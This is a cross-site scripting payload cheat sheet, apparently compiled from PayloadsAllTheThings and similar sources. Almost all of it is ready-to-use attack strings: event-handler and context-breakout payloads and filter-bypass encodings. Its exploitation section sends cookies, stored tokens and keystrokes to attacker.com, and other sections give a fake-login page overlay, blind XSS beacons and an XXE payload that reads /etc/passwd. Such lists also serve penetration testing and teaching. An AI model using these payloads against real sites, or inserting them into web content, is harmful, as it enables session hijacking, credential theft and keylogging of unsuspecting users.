# XSS (Cross-Site Scripting) Payloads

Source: PayloadsAllTheThings, XSS Hunter, security community

---

## Basic Detection Payloads

### Simple Alerts
```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
```

### Developer Tools
```html
<script>debugger;</script>
```

### Confirm/Console
```html
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>
```

---

## XSS Types

### Reflected XSS
Payload in URL/parameter, executed once:
```
https://target.com/search?q=<script>alert(1)</script>
```

### Stored XSS
Payload stored on server (comments, profiles):
```html
<script>alert(1)</script>
```

### DOM-based XSS
Payload modifies DOM directly:
```
https://target.com/#<img src=x onerror=alert(1)>
```

---

## Common Payloads

### Image Tag
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<img src=javascript:alert(1)>
<img src/onerror=alert(1)>
```

### SVG Tag
```html
<svg onload=alert(1)>
<svg onload=alert(document.domain)>
<svg onmouseover=alert(1)>
```

### Input Tag
```html
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus>
```

### Body Tag
```html
<body onload=alert(1)>
<body onpageshow=alert(1)>
```

### Video/Audio Tags
```html
<video onerror=alert(1)><source>
<audio onerror=alert(1)><source>
```

### Details Tag
```html
<details ontoggle=alert(1) open>
```

### Select Tag
```html
<select onfocus=alert(1) autofocus>
```

### Marquee Tag
```html
<marquee onstart=alert(1)>
<marquee onscroll=alert(1)>
```

---

## HTML5 Tags

```html
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<track src=x onerror=alert(1)>
<source src=x onerror=alert(1)>
```

---

## Event Handlers

```html
onload=alert(1)
onerror=alert(1)
onfocus=alert(1)
onblur=alert(1)
onclick=alert(1)
onmouseover=alert(1)
onmouseout=alert(1)
onchange=alert(1)
onsubmit=alert(1)
onreset=alert(1)
onselect=alert(1)
onkeydown=alert(1)
onkeypress=alert(1)
onkeyup=alert(1)
```

---

## JavaScript Context

### Inside Script Tags
```html
</script><script>alert(1)</script>
';alert(1);//
';alert(1);'
"-alert(1)-"
';alert(1);var a='
```

### Inside Variables
```html
'-alert(1)-'
'-alert(1)//
\'-alert(1)//
```

### Template Literals
```html
${alert(1)}
```

---

## URI Wrappers

### javascript:
```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
<img src="javascript:alert(1)">
```

### data:
```html
<a href="data:text/html,<script>alert(1)</script>">Click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```

### vbscript: (IE)
```html
<a href="vbscript:MsgBox(1)">Click</a>
```

---

## Exploitation Payloads

### Cookie Stealing
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<script>new Image().src="http://attacker.com/?c="+document.cookie;</script>
<script>fetch('http://attacker.com', {method: 'POST', mode: 'no-cors', body: document.cookie});</script>
```

### LocalStorage/SessionStorage
```html
<script>document.location='http://attacker.com/?c='+localStorage.getItem('token')</script>
<script>new Image().src="http://attacker.com/?c="+localStorage.getItem('access_token');</script>
```

### Keylogger
```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://attacker.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

### CORS Data Exfiltration
```html
<script>
  fetch('https://attacker.com', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
  });
</script>
```

### UI Redressing (Fake Login)
```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</h1>>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

---

## Blind XSS

### XSS Hunter Payload
```html
<script src="https://xsshunter.attacker.com"></script>
```

### Custom Blind XSS
```html
<script>fetch('https://attacker.com/log?data='+document.cookie)</script>
```

---

## Polyglot XSS

Works in multiple contexts:
```html
'"--></script><script>alert(1)</script>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )
```

---

## Filter Bypass

### Case Variations
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

### Encoding
```html
<script>alert(1)</script>
<script>alert(1)</script>
<%73%63%72%69%70%74%3ealert(1)</script%3e
```

### Double Encoding
```html
%253Cscript%253Ealert(1)%253C/script%253E
```

### HTML Entities
```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

### Unicode Normalization
```html
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
```

### Null Bytes
```html
<scr%00ipt>alert(1)</scr%00ipt>
```

### Whitespace Alternatives
```html
<img/src=x/onerror=alert(1)>
<img%20src=x%20onerror=alert(1)>
<imgsrc=xonerror=alert(1)>
```

---

## Mutated XSS (mXSS)

```html
<table background="javascript:alert(1)">
<math><mstyle><img src=x onerror=alert(1)>
```

---

## XSS in Files

### SVG File
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
```

### XML File
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Markdown File
```markdown
[Click me](javascript:alert(1))
<img src=x onerror=alert(1)>
```

### CSS File
```css
body {
  background: url("javascript:alert(1)");
}
```

---

## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- https://portswigger.net/web-security/cross-site-scripting
- https://xsshunter.com/
- http://www.xss-payloads.com/
